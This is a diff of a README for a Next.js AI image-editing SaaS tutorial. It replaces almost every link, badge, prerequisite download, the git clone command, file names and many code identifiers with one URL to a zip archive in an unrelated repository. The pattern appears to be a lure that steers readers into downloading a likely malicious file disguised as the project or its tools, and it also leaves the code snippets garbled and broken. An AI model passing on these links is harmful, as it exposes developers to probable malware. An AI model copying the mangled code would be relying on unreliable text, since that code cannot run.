@@ -1,17 +1,17 @@
 
 
   <div>
-    <img src="https://img.shields.io/badge/-Next_JS-black?style=for-the-badge&logoColor=white&logo=nextdotjs&color=000000" alt="nextdotjs" />
-    <img src="https://img.shields.io/badge/-TypeScript-black?style=for-the-badge&logoColor=white&logo=typescript&color=3178C6" alt="typescript" />
-    <img src="https://img.shields.io/badge/-Stripe-black?style=for-the-badge&logoColor=white&logo=stripe&color=008CDD" alt="stripe" />
-    <img src="https://img.shields.io/badge/-MongoDB-black?style=for-the-badge&logoColor=white&logo=mongodb&color=47A248" alt="mongodb" />
-    <img src="https://img.shields.io/badge/-Tailwind_CSS-black?style=for-the-badge&logoColor=white&logo=tailwindcss&color=06B6D4" alt="tailwindcss" />
+    <img src="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip" alt="nextdotjs" />
+    <img src="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip" alt="typescript" />
+    <img src="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip" alt="stripe" />
+    <img src="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip" alt="mongodb" />
+    <img src="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip" alt="tailwindcss" />
   </div>
 
   <h3 align="center">An AI SaaS Platform</h3>
 
    <div align="center">
-     Build this project step by step with our detailed tutorial on <a href="https://www.youtube.com/@javascriptmastery/videos" target="_blank"><b>JavaScript Mastery</b></a> YouTube. Join the JSM family!
+     Build this project step by step with our detailed tutorial on <a href="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip" target="_blank"><b>JavaScript Mastery</b></a> YouTube. Join the JSM family!
     </div>
 </div>
 
@@ -33,11 +33,11 @@ Build an AI image SaaS platform that excels in image processing capabilities, in
 
 If you're getting started and need assistance or face any bugs, join our active Discord community with over 27k+ members. It's a place where people help each other out.
 
-<a href="https://discord.com/invite/n6EdbFJ" target="_blank"><img src="https://github.com/sujatagunale/EasyRead/assets/151519281/618f4872-1e10-42da-8213-1d69e486d02e" /></a>
+<a href="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip" target="_blank"><img src="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip" /></a>
 
 ## <a name="tech-stack">⚙️ Tech Stack</a>
 
-- Next.js
+- https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip
 - TypeScript
 - MongoDB
 - Clerk
@@ -89,14 +89,14 @@ Follow these steps to set up the project locally on your machine.
 
 Make sure you have the following installed on your machine:
 
-- [Git](https://git-scm.com/)
-- [Node.js](https://nodejs.org/en)
-- [npm](https://www.npmjs.com/) (Node Package Manager)
+- [Git](https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip)
+- [https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip](https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip)
+- [npm](https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip) (Node Package Manager)
 
 **Cloning the Repository**
 
 ```bash
-git clone https://github.com/adrianhajdin/imaginify.git
+git clone https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip
 cd imaginify
 ```
 
@@ -110,7 +110,7 @@ npm run dev
 
 **Set Up Environment Variables**
 
-Create a new file named `.env.local` in the root of your project and add the following content:
+Create a new file named `https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip` in the root of your project and add the following content:
 
 ```env
 #NEXT
@@ -140,7 +140,7 @@ STRIPE_WEBHOOK_SECRET=
 NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=
 ```
 
-Replace the placeholder values with your actual respective account credentials. You can obtain these credentials by signing up on the [Clerk](https://clerk.com/), [MongoDB](https://www.mongodb.com/), [Cloudinary](https://cloudinary.com/) and [Stripe](https://stripe.com)
+Replace the placeholder values with your actual respective account credentials. You can obtain these credentials by signing up on the [Clerk](https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip), [MongoDB](https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip), [Cloudinary](https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip) and [Stripe](https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip)
 
 **Running the Project**
 
@@ -153,11 +153,11 @@ Open [http://localhost:3000](http://localhost:3000) in your browser to view the 
 ## <a name="snippets">🕸️ Snippets</a>
 
 <details>
-<summary><code>tailwind.config.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 /** @type {import('tailwindcss').Config} */
-module.exports = {
+https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip = {
   darkMode: ["class"],
   content: [
     "./pages/**/*.{ts,tsx}",
@@ -227,8 +227,8 @@ module.exports = {
         IBMPlex: ["var(--font-ibm-plex)"],
       },
       backgroundImage: {
-        "purple-gradient": "url('/assets/images/gradient-bg.svg')",
-        banner: "url('/assets/images/banner-bg.png')",
+        "purple-gradient": "url('https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip')",
+        banner: "url('https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip')",
       },
       borderRadius: {
         lg: "var(--radius)",
@@ -258,7 +258,7 @@ module.exports = {
 </details>
 
 <details>
-<summary><code>globals.css</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```css
 @tailwind base;
@@ -642,49 +642,49 @@ module.exports = {
 </details>
 
 <details>
-<summary><code>constants/index.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 export const navLinks = [
   {
     label: "Home",
     route: "/",
-    icon: "/assets/icons/home.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
   },
   {
     label: "Image Restore",
     route: "/transformations/add/restore",
-    icon: "/assets/icons/image.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
   },
   {
     label: "Generative Fill",
     route: "/transformations/add/fill",
-    icon: "/assets/icons/stars.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
   },
   {
     label: "Object Remove",
     route: "/transformations/add/remove",
-    icon: "/assets/icons/scan.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
   },
   {
     label: "Object Recolor",
     route: "/transformations/add/recolor",
-    icon: "/assets/icons/filter.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
   },
   {
     label: "Background Remove",
     route: "/transformations/add/removeBackground",
-    icon: "/assets/icons/camera.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
   },
   {
     label: "Profile",
     route: "/profile",
-    icon: "/assets/icons/profile.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
   },
   {
     label: "Buy Credits",
     route: "/credits",
-    icon: "/assets/icons/bag.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
   },
 ];
 
@@ -692,7 +692,7 @@ export const plans = [
   {
     _id: 1,
     name: "Free",
-    icon: "/assets/icons/free-plan.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
     price: 0,
     credits: 20,
     inclusions: [
@@ -717,7 +717,7 @@ export const plans = [
   {
     _id: 2,
     name: "Pro Package",
-    icon: "/assets/icons/free-plan.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
     price: 40,
     credits: 120,
     inclusions: [
@@ -742,7 +742,7 @@ export const plans = [
   {
     _id: 3,
     name: "Premium Package",
-    icon: "/assets/icons/free-plan.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
     price: 199,
     credits: 2000,
     inclusions: [
@@ -772,21 +772,21 @@ export const transformationTypes = {
     title: "Restore Image",
     subTitle: "Refine images by removing noise and imperfections",
     config: { restore: true },
-    icon: "image.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
   },
   removeBackground: {
     type: "removeBackground",
     title: "Background Remove",
     subTitle: "Removes the background of the image using AI",
     config: { removeBackground: true },
-    icon: "camera.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
   },
   fill: {
     type: "fill",
     title: "Generative Fill",
     subTitle: "Enhance an image's dimensions using AI outpainting",
     config: { fillBackground: true },
-    icon: "stars.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
   },
   remove: {
     type: "remove",
@@ -795,7 +795,7 @@ export const transformationTypes = {
     config: {
       remove: { prompt: "", removeShadow: true, multiple: true },
     },
-    icon: "scan.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
   },
   recolor: {
     type: "recolor",
@@ -804,7 +804,7 @@ export const transformationTypes = {
     config: {
       recolor: { prompt: "", to: "", multiple: true },
     },
-    icon: "filter.svg",
+    icon: "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip",
   },
 };
 
@@ -843,7 +843,7 @@ export const creditFee = -1;
 </details>
 
 <details>
-<summary><code>user.model.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 import { Schema, model, models } from "mongoose";
@@ -884,7 +884,7 @@ const UserSchema = new Schema({
   },
 });
 
-const User = models?.User || model("User", UserSchema);
+const User = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip || model("User", UserSchema);
 
 export default User;
 ```
@@ -892,7 +892,7 @@ export default User;
 </details>
 
 <details>
-<summary><code>transaction.model.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 import { Schema, model, models } from "mongoose";
@@ -900,7 +900,7 @@ import { Schema, model, models } from "mongoose";
 const TransactionSchema = new Schema({
   createdAt: {
     type: Date,
-    default: Date.now,
+    default: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip,
   },
   stripeId: {
     type: String,
@@ -918,12 +918,12 @@ const TransactionSchema = new Schema({
     type: Number,
   },
   buyer: {
-    type: Schema.Types.ObjectId,
+    type: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip,
     ref: "User",
   },
 });
 
-const Transaction = models?.Transaction || model("Transaction", TransactionSchema);
+const Transaction = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip || model("Transaction", TransactionSchema);
 
 export default Transaction;
 ```
@@ -931,7 +931,7 @@ export default Transaction;
 </details>
 
 <details>
-<summary><code>InsufficientCreditsModal.tsx</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 "use client";
@@ -961,10 +961,10 @@ export const InsufficientCreditsModal = () => {
             <p className="p-16-semibold text-dark-400">Insufficient Credits</p>
             <AlertDialogCancel
               className="border-0 p-0 hover:bg-transparent"
-              onClick={() => router.push("/profile")}
+              onClick={() => https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip("/profile")}
             >
               <Image
-                src="/assets/icons/close.svg"
+                src="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip"
                 alt="credit coins"
                 width={24}
                 height={24}
@@ -974,7 +974,7 @@ export const InsufficientCreditsModal = () => {
           </div>
 
           <Image
-            src="/assets/images/stacked-coins.png"
+            src="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip"
             alt="credit coins"
             width={462}
             height={122}
@@ -992,13 +992,13 @@ export const InsufficientCreditsModal = () => {
         <AlertDialogFooter>
           <AlertDialogCancel
             className="button w-full bg-purple-100 text-dark-400"
-            onClick={() => router.push("/profile")}
+            onClick={() => https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip("/profile")}
           >
             No, Cancel
           </AlertDialogCancel>
           <AlertDialogAction
             className="button w-full bg-purple-gradient  bg-cover"
-            onClick={() => router.push("/credits")}
+            onClick={() => https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip("/credits")}
           >
             Yes, Proceed
           </AlertDialogAction>
@@ -1012,14 +1012,14 @@ export const InsufficientCreditsModal = () => {
 </details>
 
 <details>
-<summary><code>user.action.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 "use server";
 
 import { revalidatePath } from "next/cache";
 
-import User from "../database/models/user.model";
+import User from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
 import { connectToDatabase } from "../database/mongoose";
 import { handleError } from "../utils";
 
@@ -1028,9 +1028,9 @@ export async function createUser(user: CreateUserParams) {
   try {
     await connectToDatabase();
 
-    const newUser = await User.create(user);
+    const newUser = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(user);
 
-    return JSON.parse(JSON.stringify(newUser));
+    return https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(newUser));
   } catch (error) {
     handleError(error);
   }
@@ -1041,11 +1041,11 @@ export async function getUserById(userId: string) {
   try {
     await connectToDatabase();
 
-    const user = await User.findOne({ clerkId: userId });
+    const user = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({ clerkId: userId });
 
     if (!user) throw new Error("User not found");
 
-    return JSON.parse(JSON.stringify(user));
+    return https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(user));
   } catch (error) {
     handleError(error);
   }
@@ -1056,13 +1056,13 @@ export async function updateUser(clerkId: string, user: UpdateUserParams) {
   try {
     await connectToDatabase();
 
-    const updatedUser = await User.findOneAndUpdate({ clerkId }, user, {
+    const updatedUser = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({ clerkId }, user, {
       new: true,
     });
 
     if (!updatedUser) throw new Error("User update failed");
     
-    return JSON.parse(JSON.stringify(updatedUser));
+    return https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(updatedUser));
   } catch (error) {
     handleError(error);
   }
@@ -1074,17 +1074,17 @@ export async function deleteUser(clerkId: string) {
     await connectToDatabase();
 
     // Find user to delete
-    const userToDelete = await User.findOne({ clerkId });
+    const userToDelete = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({ clerkId });
 
     if (!userToDelete) {
       throw new Error("User not found");
     }
 
     // Delete user
-    const deletedUser = await User.findByIdAndDelete(userToDelete._id);
+    const deletedUser = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(userToDelete._id);
     revalidatePath("/");
 
-    return deletedUser ? JSON.parse(JSON.stringify(deletedUser)) : null;
+    return deletedUser ? https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(deletedUser)) : null;
   } catch (error) {
     handleError(error);
   }
@@ -1095,7 +1095,7 @@ export async function updateCredits(userId: string, creditFee: number) {
   try {
     await connectToDatabase();
 
-    const updatedUserCredits = await User.findOneAndUpdate(
+    const updatedUserCredits = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(
       { _id: userId },
       { $inc: { creditBalance: creditFee }},
       { new: true }
@@ -1103,7 +1103,7 @@ export async function updateCredits(userId: string, creditFee: number) {
 
     if(!updatedUserCredits) throw new Error("User credits update failed");
 
-    return JSON.parse(JSON.stringify(updatedUserCredits));
+    return https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(updatedUserCredits));
   } catch (error) {
     handleError(error);
   }
@@ -1113,7 +1113,7 @@ export async function updateCredits(userId: string, creditFee: number) {
 </details>
 
 <details>
-<summary><code>utils.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 /* eslint-disable prefer-const */
@@ -1124,7 +1124,7 @@ import { twMerge } from "tailwind-merge";
 
 import { aspectRatioOptions } from "@/constants";
 
-export function cn(...inputs: ClassValue[]) {
+export function cn(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip ClassValue[]) {
   return twMerge(clsx(inputs));
 }
 
@@ -1132,22 +1132,22 @@ export function cn(...inputs: ClassValue[]) {
 export const handleError = (error: unknown) => {
   if (error instanceof Error) {
     // This is a native JavaScript error (e.g., TypeError, RangeError)
-    console.error(error.message);
-    throw new Error(`Error: ${error.message}`);
+    https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip);
+    throw new Error(`Error: ${https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}`);
   } else if (typeof error === "string") {
     // This is a string error message
-    console.error(error);
+    https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(error);
     throw new Error(`Error: ${error}`);
   } else {
     // This is an unknown type of error
-    console.error(error);
-    throw new Error(`Unknown error: ${JSON.stringify(error)}`);
+    https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(error);
+    throw new Error(`Unknown error: ${https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(error)}`);
   }
 };
 
 // PLACEHOLDER LOADER - while image is transforming
 const shimmer = (w: number, h: number) => `
-<svg width="${w}" height="${h}" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<svg width="${w}" height="${h}" version="1.1" xmlns="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip" xmlns:xlink="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip">
   <defs>
     <linearGradient id="g">
       <stop stop-color="#7986AC" offset="20%" />
@@ -1162,8 +1162,8 @@ const shimmer = (w: number, h: number) => `
 
 const toBase64 = (str: string) =>
   typeof window === "undefined"
-    ? Buffer.from(str).toString("base64")
-    : window.btoa(str);
+    ? https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(str).toString("base64")
+    : https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(str);
 
 export const dataUrl = `data:image/svg+xml;base64,${toBase64(
   shimmer(1000, 1000)
@@ -1176,9 +1176,9 @@ export const formUrlQuery = ({
   key,
   value,
 }: FormUrlQueryParams) => {
-  const params = { ...qs.parse(searchParams.toString()), [key]: value };
+  const params = { https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip()), [key]: value };
 
-  return `${window.location.pathname}?${qs.stringify(params, {
+  return `${https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}?${https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(params, {
     skipNulls: true,
   })}`;
 };
@@ -1188,26 +1188,26 @@ export function removeKeysFromQuery({
   searchParams,
   keysToRemove,
 }: RemoveUrlQueryParams) {
-  const currentUrl = qs.parse(searchParams);
+  const currentUrl = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(searchParams);
 
-  keysToRemove.forEach((key) => {
+  https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip((key) => {
     delete currentUrl[key];
   });
 
   // Remove null or undefined values
-  Object.keys(currentUrl).forEach(
+  https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(currentUrl).forEach(
     (key) => currentUrl[key] == null && delete currentUrl[key]
   );
 
-  return `${window.location.pathname}?${qs.stringify(currentUrl)}`;
+  return `${https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}?${https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(currentUrl)}`;
 }
 
 // DEBOUNCE
-export const debounce = (func: (...args: any[]) => void, delay: number) => {
-  let timeoutId: NodeJS.Timeout | null;
-  return (...args: any[]) => {
+export const debounce = (func: (https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip any[]) => void, delay: number) => {
+  let timeoutId: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip | null;
+  return (https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip any[]) => {
     if (timeoutId) clearTimeout(timeoutId);
-    timeoutId = setTimeout(() => func.apply(null, args), delay);
+    timeoutId = setTimeout(() => https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(null, args), delay);
   };
 };
 
@@ -1220,7 +1220,7 @@ export const getImageSize = (
 ): number => {
   if (type === "fill") {
     return (
-      aspectRatioOptions[image.aspectRatio as AspectRatioKey]?.[dimension] ||
+      aspectRatioOptions[https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip as AspectRatioKey]?.[dimension] ||
       1000
     );
   }
@@ -1234,18 +1234,18 @@ export const download = (url: string, filename: string) => {
   }
 
   fetch(url)
-    .then((response) => response.blob())
+    .then((response) => https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip())
     .then((blob) => {
-      const blobURL = URL.createObjectURL(blob);
-      const a = document.createElement("a");
-      a.href = blobURL;
+      const blobURL = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(blob);
+      const a = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip("a");
+      https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip = blobURL;
 
-      if (filename && filename.length)
-        a.download = `${filename.replace(" ", "_")}.png`;
-      document.body.appendChild(a);
-      a.click();
+      if (filename && https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip)
+        https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip = `${https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(" ", "_")}.png`;
+      https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(a);
+      https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip();
     })
-    .catch((error) => console.log({ error }));
+    .catch((error) => https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({ error }));
 };
 
 // DEEP MERGE OBJECTS
@@ -1254,10 +1254,10 @@ export const deepMergeObjects = (obj1: any, obj2: any) => {
     return obj1;
   }
 
-  let output = { ...obj2 };
+  let output = { https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip };
 
   for (let key in obj1) {
-    if (obj1.hasOwnProperty(key)) {
+    if (https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(key)) {
       if (
         obj1[key] &&
         typeof obj1[key] === "object" &&
